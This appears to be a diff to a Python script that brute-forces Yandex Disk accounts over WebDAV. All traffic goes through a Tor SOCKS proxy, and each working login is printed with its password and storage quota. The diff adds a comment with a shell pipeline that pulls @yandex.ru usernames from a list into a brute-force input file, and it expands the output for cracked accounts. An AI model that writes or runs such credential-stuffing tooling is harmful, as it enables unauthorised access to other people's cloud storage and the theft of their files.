@@ -1,5 +1,8 @@
 #!/usr/bin/python3
 #coding: utf-8
+#
+# cat notsortlist.txt | grep @yandex.ru | perl -nle 'print if m{^[[:ascii:]]+$}' | sed 's/@yandex.ru//' >> brut.txt
+#
 import requests
 import xml.etree.ElementTree as ET
 from hurry.filesize import size
@@ -8,10 +11,8 @@ import socket
 import socks
 import threading
 
-
 socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
 socket.socket = socks.socksocket
-
 
 class YaDiskException(Exception):
     """Common exception class for YaDisk. Arg 'code' have code of HTTP Error."""
@@ -23,7 +24,6 @@ class YaDiskException(Exception):
 
     def __str__(self):
         return "%d. %s" % (self.code, super(YaDiskException, self).__str__())
-
 
 class YaDiskXML(object):
     namespaces = {'d': "DAV:"}
@@ -45,7 +45,7 @@ class YaDisk(object):
     password = None
     url = "https://webdav.yandex.ru/"
     namespaces = {'d': 'DAV:'}
-    
+
     def __init__(self, login, password):
         super(YaDisk, self).__init__()
         self.login = login
@@ -66,7 +66,7 @@ class YaDisk(object):
         def parseContent(content):
             root = ET.fromstring(content)
             return {
-                'available': root.find(".//d:quota-available-bytes", namespaces=self.namespaces).text, 
+                'available': root.find(".//d:quota-available-bytes", namespaces=self.namespaces).text,
                 'used': root.find(".//d:quota-used-bytes", namespaces=self.namespaces).text
             }
 
@@ -84,12 +84,11 @@ class YaDisk(object):
         else:
             raise YaDiskException(resp.status_code, resp.content)
 
-
 def brute(username, password):
     try:
         disk = YaDisk(username, password)
         a = disk.df()
-        print('Summary size: '+ size(int(a['used'])+int(a['available'])) + " Login: " + username + " Password: " + password)
+        print('Used: '+size(int(a['used']))+' Free: '+size(int(a['available'])) + ' Summary size: '+ size(int(a['used'])+int(a['available'])) + " Login: " + username + " Password: " + password)
     except:
         #pass
         print ('Error : ' + username + ' ' + password, end="\r")
